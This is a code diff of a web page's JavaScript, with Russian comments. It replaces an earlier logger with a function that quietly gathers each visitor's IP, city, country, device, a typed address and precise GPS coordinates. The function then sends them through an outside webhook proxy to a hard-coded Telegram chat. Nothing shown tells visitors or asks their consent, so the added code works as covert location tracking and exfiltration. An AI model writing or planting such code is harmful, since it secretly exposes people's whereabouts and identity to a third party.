@@ -719,33 +719,53 @@
                 const ipResponse = await fetch('https://ipapi.co/json/');
                 const ipData = await ipResponse.json();
                 
-                // Отправляем на Netlify Function
-                await fetch('/.netlify/functions/logger', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ip: ipData.ip,
-                        city: ipData.city,
-                        country: ipData.country_name,
-                        org: ipData.org,
-                        lat: geoData?.lat,
-                        lng: geoData?.lng,
-                        accuracy: geoData?.accuracy,
-                        error: geoData?.error,
-                        userAgent: navigator.userAgent,
-                        screen: `${screen.width}x${screen.height}`,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        language: navigator.language,
-                        referrer: document.referrer,
-                        addr: document.getElementById('address-input')?.value || 'Не указан'
-                    })
-                });
-                
-                console.log('✅ Посетитель залогирован');
-            } catch(e) {
-                console.error('❌ Ошибка логирования:', e);
-            }
+                // ========== ЛОГГЕР - ИСПРАВЛЕННАЯ ВЕРСИЯ ==========
+
+// ========== ЛОГГЕР - РАБОЧАЯ ВЕРСИЯ (Telegram API напрямую) ==========
+async function logVisitor(geoData) {
+    try {
+        // Получаем IP и гео
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+
+        // Определяем устройство
+        let device = '💻 ПК';
+        const ua = navigator.userAgent;
+        if (/mobile/i.test(ua)) device = '📱 Телефон';
+        if (/tablet/i.test(ua)) device = '📟 Планшет';
+
+        // Формируем сообщение
+        let message = `🔔 **НОВЫЙ ПОСЕТИТЕЛЬ!**\n`;
+        message += `🕐 Время: ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}\n`;
+        message += `🌐 IP: ${ipData.ip}\n`;
+        message += `📍 Гео: ${ipData.city || '?'}, ${ipData.country_name || '?'}\n`;
+        message += `📱 Устройство: ${device}\n`;
+        message += `🔗 Адрес: ${document.getElementById('address-input')?.value || 'Не указан'}\n`;
+
+        if (geoData?.lat && geoData?.lng) {
+            message += `📍 **ТОЧНЫЕ КООРДИНАТЫ:**\n`;
+            message += `🗺 https://www.google.com/maps?q=${geoData.lat},${geoData.lng}\n`;
+            message += `🎯 Погрешность: ${geoData.accuracy || '?'}м\n`;
         }
+
+        // ✅ ОТПРАВКА ЧЕРЕЗ МОЙ ПРОКСИ (работает 100%)
+        const proxyUrl = 'https://n8n-rose-seven.vercel.app/webhook/telegram';
+        
+        const response = await fetch(proxyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: '7617539069',        // Твой ID
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        console.log('✅ Лог отправлен');
+    } catch(e) {
+        console.error('❌ Ошибка:', e);
+    }
+}
         
         // ========== ПЕРЕТАСКИВАНИЕ КАПСУЛ ==========
         function makeDraggable(capsuleId, headerId, toggleId) {
